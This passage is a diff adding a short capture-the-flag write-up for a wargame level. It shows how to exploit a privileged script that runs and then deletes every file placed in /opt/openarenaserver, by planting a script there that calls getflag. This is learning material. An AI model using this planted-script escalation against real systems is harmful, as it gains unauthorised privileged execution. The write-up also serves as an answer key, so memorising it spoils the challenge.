@@ -1,0 +1,27 @@
+# find files owned by level05
+-find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+-cat /usr/sbin/openarenaserver
+/////////////////////////
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+////////////////////////
+
+# Looking inside scripts shows a loop which iterate through all the files in /opt/openarenaserver/ and evaluate them.
+ulimit -t means that the following process should be terminated if it uses more CPU time than what is specified in -t. Then the file is removed.
+
+#Create a script which will get the flag
+- vim /opt/openarenaserver/getflag
+#!/bin/bash
+/bin/getflag > /tmp/flag05
+
+# Change file modes by setting on execute bits.
+-chmod +x /opt/openarenaserver/getflag
+
+Execute cat program periodically on /tmp/flag05
